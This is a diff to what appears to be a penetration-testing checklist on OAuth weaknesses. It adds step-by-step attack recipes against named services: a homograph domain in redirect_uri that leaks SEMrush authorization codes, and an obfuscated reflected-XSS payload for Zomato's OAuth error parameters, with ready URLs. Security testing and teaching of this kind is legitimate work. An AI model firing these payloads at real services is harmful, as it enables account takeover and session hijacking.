@@ -1,4 +1,4 @@
-# OAuth Weaknesses\\
+# OAuth Weaknesses
 
 ## Check List
 
@@ -558,3 +558,89 @@ OAuth Parameters
 {% endstep %}
 {% endstepper %}
 
+{% stepper %}
+{% step %}
+The attacker takes control of the homograph/IDN domain (for example, a domain that looks like oauth.semrush.com).
+{% endstep %}
+
+{% step %}
+The attacker creates an authorize address whose redirect\_uri parameter points to this domain (with Unicode characters).
+{% endstep %}
+
+{% step %}
+The user logs in and authorizes (or if already authorized, the process appears without interaction).
+{% endstep %}
+
+{% step %}
+The SEMrush server mistakenly considers the redirect\_uri to be valid and sends the authorization code to the attacker's domain (the browser converts it to a paniccode).
+{% endstep %}
+
+{% step %}
+The attacker takes the code and converts it into an access token and gains access to the user's information/operations.
+
+for example request
+
+```
+https://oauth.semrush.com/oauth2/authorize?
+response_type=code&
+scope=user.info,projects.info,siteaudit.info&
+client_id=seoquake&
+redirect_uri=https://oauth.semrush.com/oauth2/success
+```
+{% endstep %}
+
+{% step %}
+I convert the domain inside the redirect\_uri parameter to paniccode and send the request
+
+{% hint style="info" %}
+
+
+* sémrush.com
+* sêmrush.com
+* sèmrûsh.com
+* šemrush.com
+* etc.
+{% endhint %}
+{% endstep %}
+
+{% step %}
+```
+https://oauth.semrush.com/oauth2/authorize?
+response_type=code&
+scope=user.info,projects.info,siteaudit.info&
+client_id=seoquake&
+redirect_uri=https://oauth.šemrush.com/oauth2/success
+```
+{% endstep %}
+{% endstepper %}
+
+{% stepper %}
+{% step %}
+We do the authentication process inside OAuth and I get the requests using Burp Suite
+{% endstep %}
+
+{% step %}
+We do a part of the process wrongly to see the error parameter in the requests\
+Like this request
+
+```url
+Full url:https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=xss
+```
+{% endstep %}
+
+{% step %}
+If we see one of these parameters in the requests, we will inject this XSS code
+
+```javascript
+<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>
+```
+{% endstep %}
+
+{% step %}
+for example
+
+```javascript
+https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
+```
+{% endstep %}
+{% endstepper %}
